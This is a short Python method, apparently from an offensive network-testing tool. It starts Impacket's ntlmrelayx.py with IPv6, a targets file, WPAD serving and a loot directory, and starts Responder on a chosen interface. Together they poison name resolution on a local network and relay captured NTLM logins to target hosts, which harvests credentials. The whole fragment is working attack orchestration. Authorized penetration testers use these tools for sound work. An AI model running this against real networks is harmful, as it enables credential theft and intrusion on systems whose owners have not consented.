def start_processes(self):
        """
            Starts the ntlmrelayx.py and responder processes.
            Assumes you have these programs in your path.
        """
        self.relay = subprocess.Popen(['ntlmrelayx.py', '-6', '-tf', self.targets_file, '-w', '-l', self.directory, '-of', self.output_file], cwd=self.directory)
        self.responder = subprocess.Popen(['responder', '-I', self.interface_name])